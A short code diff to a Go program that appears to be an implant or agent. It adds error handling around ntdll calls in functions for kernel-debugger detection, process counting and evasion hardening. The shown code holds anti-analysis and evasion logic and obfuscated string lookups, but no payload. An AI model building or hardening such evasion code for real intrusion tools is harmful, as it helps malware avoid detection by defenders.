@@ -50,6 +50,12 @@ func runEvasionKernelCallback() string {
 }
 
 func queryKernelDebuggerInfo() bool {
+	// Resolve lazily and fail gracefully: LazyProc.Call panics when the export
+	// is missing, which would kill the whole agent on odd OS builds.
+	if err := procNtQuerySystemInfo.Find(); err != nil {
+		return false
+	}
+
 	type systemKernelDebuggerInformation struct {
 		KernelDebuggerEnabled    bool
 		KernelDebuggerNotPresent bool
@@ -71,6 +77,10 @@ func queryKernelDebuggerInfo() bool {
 }
 
 func countSystemProcesses() (uint32, uint32) {
+	if err := procNtQuerySystemInfo.Find(); err != nil {
+		return 0, 0
+	}
+
 	var retLen uint32
 	procNtQuerySystemInfo.Call(
 		uintptr(SystemProcessInformation),
@@ -124,6 +134,12 @@ func runProcessCallbackHardening() string {
 	// Attempt to set process mitigation policies that reduce callback impact
 	ntdll := syscall.NewLazyDLL("ntdll.dll")
 	procSetMitigation := ntdll.NewProc(s(SProcMitPolicy))
+
+	// Resolve first: LazyProc.Call panics on a missing export and would take
+	// the whole agent down instead of degrading to a status string.
+	if err := procSetMitigation.Find(); err != nil {
+		return "[*] ProcessSignaturePolicy: unavailable (SetProcessMitigationPolicy not exported by ntdll)\n"
+	}
 
 	// ProcessSignaturePolicy (class 8) - Block non-Microsoft signed DLLs
 	const ProcessSignaturePolicy = 8
